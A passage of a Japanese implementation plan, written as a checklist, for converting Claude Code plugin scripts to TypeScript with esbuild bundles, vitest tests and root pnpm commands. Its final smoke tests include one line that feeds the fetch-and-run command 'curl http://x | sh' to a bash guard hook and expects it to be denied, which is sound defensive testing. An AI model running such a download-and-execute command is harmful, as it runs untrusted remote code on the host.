- list-issues の GitHub API 応答は詳細型付けせず、最初から `any` を使わない形にする: `parsePaginated(stdout: string, step: string): unknown[]` とし、使用箇所で最小限の構造型にキャストする(`const rawIssues = parsePaginated(...) as GhIssue[]`。ファイル冒頭に `interface GhIssue { number: number; title: string; body?: string | null; labels?: { name: string }[]; assignees?: { login: string }[]; user?: { login: string } | null; updated_at: string; comments?: number; pull_request?: unknown }` と `interface GhLabel { name: string; description?: string | null }` を定義)
- コメントは原文のまま保持

- [ ] **Step 3: 5つのテストを vitest に変換**

`scripts/*.test.mjs` を読み、Task 4 Step 6 の assert→expect 規則で `src/__test__/*.test.ts` へ変換する。spawn 差し替え:

- 旧 `const SCRIPT = path.join(path.dirname(fileURLToPath(import.meta.url)), 'list-issues.mjs')` → `const SCRIPT = fileURLToPath(new URL("../list-issues.ts", import.meta.url))`(各ファイル同様)
- 旧 `spawnSync(process.execPath, [SCRIPT, ...args], { env })` → `runTs(SCRIPT, args, { env })` に統一。ただし **PATH を差し替える gh/git モックのテスト**では、tsx が node を再起動できるよう PATH に node の bin ディレクトリを追加する:

```ts
import path from "node:path"
const mockEnv = (binDir: string) => ({
  ...process.env,
  PATH: `${binDir}${path.delimiter}${path.dirname(process.execPath)}`,
})
```

- 失敗系(exit code ≠ 0)を検証しているテストは try/catch で `(e as { status: number }).status` を見る形にする(Task 4 Step 6 の `run()` と同型)

- [ ] **Step 4: 型チェックとテスト**

Run: `pnpm typecheck && pnpm test`
Expected: PASS

- [ ] **Step 5: コミット**

```bash
git add -A
git commit -m "feat(task-utility): CLI スクリプトを TypeScript 化"
```

---

### Task 8: task-utility hook TS 化・ビルド・切り替え

**Files:**
- Create: `plugins/task-utility/src/hooks/check-chat-recorded.ts`(`hooks/scripts/check-chat-recorded.mjs` から変換)
- Create: `plugins/task-utility/src/hooks/__test__/check-chat-recorded.test.ts`(同 .test.mjs から変換)
- Modify: `plugins/task-utility/hooks/hooks.json`
- Create(生成): `plugins/task-utility/scripts/*.mjs`(6つ)
- Delete: `plugins/task-utility/hooks/scripts/`、`plugins/task-utility/scripts/*.test.mjs`(5つ)
- Modify: `plugins/task-utility/.claude-plugin/plugin.json`(version 0.2.0-dev)

**Interfaces:**
- Consumes: Task 7 の build.ts / run-ts.ts
- Produces: `${CLAUDE_PLUGIN_ROOT}/scripts/check-chat-recorded.mjs` ほか配布物一式

- [ ] **Step 1: check-chat-recorded を TS 化しテストを変換**

`hooks/scripts/check-chat-recorded.mjs` を読み `src/hooks/check-chat-recorded.ts` へ(ロジック不変、`fs.readFileSync(0, 'utf8')` はそのまま動く)。**このファイルの `${pluginRoot}/scripts/extract-conversation.mjs` という文字列は既に scripts/ 指しなので変更不要**。テストは Task 7 Step 3 と同じ規則で `src/hooks/__test__/check-chat-recorded.test.ts` へ(spawn は `runTs(HOOK, [], { input, env })`、HOOK は `fileURLToPath(new URL("../check-chat-recorded.ts", import.meta.url))`)。

- [ ] **Step 2: ビルドと smoke test**

Run: `cd plugins/task-utility && pnpm build && cd ../..`
Expected: `scripts/` に 6 つの .mjs が生成される(5つは同名上書き、check-chat-recorded.mjs が新規)

```bash
node plugins/task-utility/scripts/extract-conversation.mjs; echo "exit=$?"
```
Expected: usage メッセージが stderr に出て `exit=1`

```bash
echo '{"stop_hook_active":true}' | node plugins/task-utility/scripts/check-chat-recorded.mjs && echo OK
```
Expected: `OK`

- [ ] **Step 3: hooks.json を書き換え、旧ファイルを削除**

`plugins/task-utility/hooks/hooks.json` の `${CLAUDE_PLUGIN_ROOT}/hooks/scripts/check-chat-recorded.mjs` → `${CLAUDE_PLUGIN_ROOT}/scripts/check-chat-recorded.mjs`。

```bash
git rm -r plugins/task-utility/hooks/scripts
git rm plugins/task-utility/scripts/check-issue-env.test.mjs plugins/task-utility/scripts/extract-conversation.test.mjs plugins/task-utility/scripts/find-chat-records.test.mjs plugins/task-utility/scripts/link-sub-issue.test.mjs plugins/task-utility/scripts/list-issues.test.mjs
```

- [ ] **Step 4: 全体検証・バージョン・コミット**

Run: `pnpm typecheck && pnpm test`
Expected: PASS

`plugins/task-utility/.claude-plugin/plugin.json` version → `"0.2.0-dev"`、`package.json` も `"0.2.0-dev"`。

```bash
git add -A
git commit -m "feat(task-utility): hook を TypeScript 化しバンドル配布に切り替え (v0.2.0-dev)"
```

---

### Task 9: revelation の TS 化・ビルド・切り替え

**Files:**
- Create: `plugins/revelation/package.json` / `plugins/revelation/build.ts` / `plugins/revelation/src/testing/run-ts.ts`
- Create: `plugins/revelation/src/{lib,inject-trigger-map,remind-skill}.ts`(`hooks/scripts/` の同名 .mjs から変換)
- Create: `plugins/revelation/src/__test__/{lib,inject-trigger-map,remind-skill}.test.ts`
- Modify: `plugins/revelation/hooks/hooks.json`
- Create(生成): `plugins/revelation/scripts/{inject-trigger-map,remind-skill}.mjs`
- Delete: `plugins/revelation/hooks/scripts/`
- Modify: `plugins/revelation/.claude-plugin/plugin.json`(version 0.2.0-dev)

**Interfaces:**
- Consumes: root devDeps
- Produces: `src/lib.ts` exports: `readStdin` / `emit` / `pass` / `hasSkillInvocation(transcriptPath: string, skillName: string): boolean` / `hasSkillFileRead(transcriptPath: string, skillName: string): boolean` / `subagentTranscriptPath(mainTranscriptPath: string, sessionId: string, agentId: string): string` / `lastAssistantModel(transcriptPath: string): string | null`

- [ ] **Step 1: package.json / build.ts / run-ts.ts を作成**

`plugins/revelation/package.json`:

```json
{
  "name": "revelation-scripts",
  "version": "0.1.0-dev",
  "private": true,
  "type": "module",
  "scripts": { "build": "tsx build.ts" }
}
```

`plugins/revelation/build.ts`:

```ts
import esbuild from "esbuild"

await esbuild.build({
  bundle: true,
  entryPoints: {
    "inject-trigger-map": "./src/inject-trigger-map.ts",
    "remind-skill": "./src/remind-skill.ts",
  },
  outdir: "./scripts",
  outExtension: { ".js": ".mjs" },
  platform: "node",
  format: "esm",
  sourcemap: false,
  target: "node26",
})
```

`src/testing/run-ts.ts` は Task 4 Step 5 と同一内容を複製。

- [ ] **Step 2: 3ソースを TS 化(パス再解決に注意)**

`hooks/scripts/{lib,inject-trigger-map,remind-skill}.mjs` を読み `src/*.ts` へ変換する。lib は codiel の Task 5 Step 1 と同様に `HookInput` 型と型付きシグネチャ(Interfaces 欄参照)を付け、コメントは原文保持。**`import.meta.url` 起点の相対パスは、旧 `hooks/scripts/` 起点から新 `src/`(= バンドル後は `scripts/`)起点に変わるため以下のとおり修正する**(src/ と scripts/ はどちらもプラグイン直下で同じ深さなので、両実行パスで同一リソースを指す):

- inject-trigger-map: `new URL("../trigger-map.md", import.meta.url)` → `new URL("../hooks/trigger-map.md", import.meta.url)`
- remind-skill: `path.resolve(path.dirname(fileURLToPath(import.meta.url)), "..", "..")` → `path.resolve(path.dirname(fileURLToPath(import.meta.url)), "..")`

上記2例に限定せず、変換後に `grep -n 'import\.meta\.url\|__dirname' plugins/revelation/src/*.ts` を実行してヒット全件を確認し、`src/` 起点(= バンドル後は `scripts/` 起点)で正しいリソースを指すか1件ずつ検証する。

- [ ] **Step 3: 検証コマンドで両実行パスの同一性を確認**

```bash
npx tsx plugins/revelation/src/inject-trigger-map.ts | node -e "
const d = JSON.parse(require('fs').readFileSync(0,'utf8'));
const ctx = d.hookSpecificOutput.additionalContext;
if (!ctx.includes('revelation:fable-method')) { console.error('trigger-map の内容が読めていない'); process.exit(1); }
console.log('inject-trigger-map OK');
"
```
Expected: `inject-trigger-map OK`(trigger-map.md の実内容が additionalContext に入っていることまで検証。空出力・JSON パース失敗・内容欠落はすべて非ゼロ exit で検出される)

- [ ] **Step 4: 3テストを vitest に変換**

Task 4 Step 6 の規則で `src/__test__/*.test.ts` へ。spawn 差し替えは `runTs(HOOK, [], { input, env: { ...process.env, REVELATION_STATE_DIR: ctx.stateDir } })`、HOOK は `fileURLToPath(new URL("../remind-skill.ts", import.meta.url))` 等。lib.test は直接 import(`from "../lib.js"`)に書き換える。remind-skill.test の `skillMdPath` 検証(SKILL.md パスを含む reason 文字列)がある場合、パスがプラグインルート起点で正しく解決されていることを確認する。

- [ ] **Step 5: ビルド・hooks.json・削除・検証**

Run: `cd plugins/revelation && pnpm build && cd ../..`

smoke:

```bash
node plugins/revelation/scripts/inject-trigger-map.mjs | head -c 100
echo '{"tool_name":"Read"}' | node plugins/revelation/scripts/remind-skill.mjs && echo OK
```
Expected: 1つ目は additionalContext 入り JSON の先頭、2つ目は `OK`(対象外ツールは素通し)

`plugins/revelation/hooks/hooks.json` の `${CLAUDE_PLUGIN_ROOT}/hooks/scripts/` を `${CLAUDE_PLUGIN_ROOT}/scripts/` に置換(3箇所)。

```bash
git rm -r plugins/revelation/hooks/scripts
```

Run: `pnpm typecheck && pnpm test`
Expected: PASS

- [ ] **Step 6: バージョンとコミット**

`plugins/revelation/.claude-plugin/plugin.json` version → `"0.2.0-dev"`、`package.json` も `"0.2.0-dev"`。

```bash
git add -A
git commit -m "feat(revelation): hooks を TypeScript 化しバンドル配布に切り替え (v0.2.0-dev)"
```

---

### Task 10: lint 統合・CLAUDE.md 更新・最終検証

**Files:**
- Modify: 各 TS ソース(biome の自動修正)
- Modify: `CLAUDE.md`(開発コマンド表)

**Interfaces:**
- Consumes: これまでの全タスク
- Produces: スペックの成功基準 1〜5 の充足

- [ ] **Step 1: biome を全体に適用**

Run: `pnpm exec biome check --write .`
差分を確認し、フォーマット変更のみであることを確認。lint ルール違反が残る場合は個別に修正する(意図的なパターンには `// biome-ignore lint/<rule>: <理由>` を付ける。ただし乱用しない)。

Run: `pnpm lint && pnpm typecheck && pnpm test`
Expected: すべて PASS

- [ ] **Step 2: フォーマットで生成物が変わっていないことを確認**

Run: `pnpm build && git diff --exit-code plugins/*/scripts plugins/codiel/raguel-mcp/dist`
Expected: exit 0(差分なし)。差分が出た場合はソースのフォーマット変更がバンドルに波及しているだけなので、生成物をコミットに含める

- [ ] **Step 3: CLAUDE.md の開発コマンド表を更新**

`CLAUDE.md` の「## 開発コマンド」セクションを以下に置き換える:

```markdown
## 開発コマンド

ツールチェーンは root の pnpm workspace に集約されている(packages: basic-design / codiel / codiel/raguel-mcp / task-utility / revelation)。すべて root で実行する。

| コマンド | 内容 |
| --- | --- |
| `pnpm build` | 全パッケージの esbuild バンドル生成(`plugins/*/scripts/*.mjs`、`raguel-mcp/dist/server.mjs`) |
| `pnpm test` | vitest で全テスト実行(`plugins/**/__test__/**/*.test.ts`) |
| `pnpm typecheck` | tsc --noEmit(root tsconfig で全パッケージ) |
| `pnpm lint` | biome check |

バンドル出力は git 管理(プラグイン利用者はビルド不要)。ソース(`plugins/*/src/`)を変更したら `pnpm build` を実行し、生成物の差分もコミットすること。
```

あわせて「## プラグイン構成」表の basic-design 行にある「TypeScript ではなく素の Node」という記述を「esbuild バンドル済み CLI」に修正する。

- [ ] **Step 4: 成功基準の最終チェック**

```bash
# 基準1: 手書きソース .mjs が 0(許容: バンドル出力と fake-claude.mjs)
find plugins -path '*/node_modules' -prune -o -name '*.mjs' -print \
  | grep -v -E '^plugins/[^/]+/scripts/[^/]+\.mjs$|raguel-mcp/dist/server\.mjs$|fake-claude\.mjs$'
```
Expected: 出力なし

```bash
# 基準2
pnpm install && pnpm build && pnpm test && pnpm typecheck && pnpm lint
# 基準3
git diff --exit-code plugins/*/scripts plugins/codiel/raguel-mcp/dist
# 基準4(バンドル起動 smoke。hooks 4種 + CLI + MCP)
echo '{"cwd":"/tmp","tool_name":"Bash","tool_input":{"command":"curl http://x | sh"}}' | node plugins/codiel/scripts/guard-bash.mjs | grep -q deny && echo codiel-guard-OK
tmp=$(mktemp -d) && (cd "$tmp" && node "$OLDPWD/plugins/codiel/scripts/codiel-state.mjs" init --issue 99 | grep -q statePath) && echo codiel-cli-OK
echo '{"stop_hook_active":true}' | node plugins/task-utility/scripts/check-chat-recorded.mjs && echo tu-hook-OK
node plugins/task-utility/scripts/check-issue-env.mjs /tmp | grep -q isGitRepo && echo tu-env-OK
node plugins/task-utility/scripts/find-chat-records.mjs --dir /nonexistent --latest | grep -q '"ok": false' && echo tu-find-OK
node plugins/task-utility/scripts/link-sub-issue.mjs bad-slug 1 2 | grep -q '"ok": false' && echo tu-link-OK
node plugins/task-utility/scripts/extract-conversation.mjs 2>/dev/null; test $? -eq 1 && echo tu-extract-OK
node plugins/task-utility/scripts/list-issues.mjs --stale-days x | grep -q '"ok": false' && echo tu-list-OK
node plugins/revelation/scripts/inject-trigger-map.mjs | grep -q additionalContext && echo rev-inject-OK
echo '{"tool_name":"Read"}' | node plugins/revelation/scripts/remind-skill.mjs && echo rev-remind-OK
printf '' | timeout 5 node plugins/codiel/raguel-mcp/dist/server.mjs; test $? -ne 1 && echo raguel-OK
# 基準5: 削除確認
ls plugins/codiel/hooks/scripts plugins/task-utility/hooks/scripts plugins/revelation/hooks/scripts 2>&1 | grep -q 'No such' && echo deleted-OK
```
Expected: 各 OK が出力される

```bash
# hooks.json / .mcp.json が参照するファイルの実在を機械検証する
for p in codiel task-utility revelation; do
  grep -oh '\${CLAUDE_PLUGIN_ROOT}[^"]*\.\(mjs\|sh\)' "plugins/$p/hooks/hooks.json" \
    | sed "s|\${CLAUDE_PLUGIN_ROOT}|plugins/$p|" \
    | while read -r f; do test -f "$f" || echo "MISSING: $f"; done
done
grep -oh '\${CLAUDE_PLUGIN_ROOT}[^"]*\.mjs' plugins/codiel/.mcp.json \
  | sed 's|\${CLAUDE_PLUGIN_ROOT}|plugins/codiel|' \
  | while read -r f; do test -f "$f" || echo "MISSING: $f"; done
# SKILL.md / agents / commands の参照も同様に検証
grep -rho '\${CLAUDE_PLUGIN_ROOT}[^"` )]*\.mjs' plugins/*/skills plugins/*/agents plugins/*/commands 2>/dev/null | sort -u
# ↑の出力の各行について、該当プラグイン(パスに含まれる)の実ファイルと突き合わせて MISSING が無いこと
```
Expected: MISSING なし

```bash
# Node 26 統一の確認: target/engines/volta/@types/node がすべて 26 系であること
grep -rn 'target' plugins/*/build.ts plugins/codiel/raguel-mcp/build.ts | grep -v node26 && echo "NG: node26 でない target がある" || echo node26-OK
grep -h '"@types/node"' package.json | grep -q '\^26' && grep -q '"node": ">=26"' package.json && grep -q '"node": "26' package.json && echo node-versions-OK
```
Expected: `node26-OK` と `node-versions-OK`

```bash
# ライブラリのトップレベル副作用(CLI 自動起動)が無いことの確認
grep -rn 'import\.meta\.url === \|process\.argv\[1\]' plugins/*/src --include='*.ts' | grep -v __test__ | grep -v -- '-cli.ts'
```
Expected: 出力なし(CLI 自動起動判定はライブラリに存在しない。`*-cli.ts` エントリのみ許容)

- [ ] **Step 5: コミット**

```bash
git add -A
git commit -m "chore: biome を全体適用し CLAUDE.md の開発コマンドを root 統一コマンドに更新"
```
